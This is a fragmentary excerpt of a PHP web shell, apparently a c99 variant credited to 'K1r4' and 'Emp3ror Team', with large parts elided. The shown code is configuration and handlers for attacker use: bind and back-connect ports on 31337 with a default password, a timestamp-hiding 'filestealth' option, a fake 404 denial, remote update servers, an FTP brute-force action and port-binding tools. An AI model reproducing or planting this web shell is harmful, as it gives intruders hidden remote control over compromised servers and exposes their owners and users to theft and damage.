...
$accessdeniedmess = "404";

$gzipencode = TRUE; //Encode with gzip?

$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)

$k1r4_updateurl = ""; //Update server
$k1r4_sourcesurl = ""; //Sources-server

$filestealth = TRUE; //if TRUE, don't change modify- and access-time

$donated_html = "<center></center>";
...
$log_email = "spam@nomail.com"; //Default e-mail for sending logs
...
$bindport_pass = "4835";  // default password for binding
$bindport_port = "31337"; // default port for binding
$bc_port = "31337"; // default port for back-connect
...
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"\">kira</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 ...
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  ...
  header("WWW-Authenticate: Basic realm=\"ttn: ".$login_txt."\"");
...
$ud = urlencode($d);
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - Have some fun</title><STYLE>
...
if ($act == "ftpquickbrute")
{
 ...
 if (!win) {echo "These functions do not work in Windows!<br><br>";}
 else
 {
...
if ($act == "tools")
{
 ...
 if (empty($datapipe["remoteaddr"])) {$datapipe["remoteaddr"] = "";}
 ...
 if (!empty($bindsubmit))
 {
  ...
  elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port already in use, select any other!<br>";}
  else
  {
   $w = explode(".",$bind["src"]);
   $ext = $w[count($w)-1];
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ Shell [ci] . Biz <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>Modded by</b></u></a> K1r4 @ gmail. com| <a href="#"><font color="#FF0000">Emp3ror Team</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
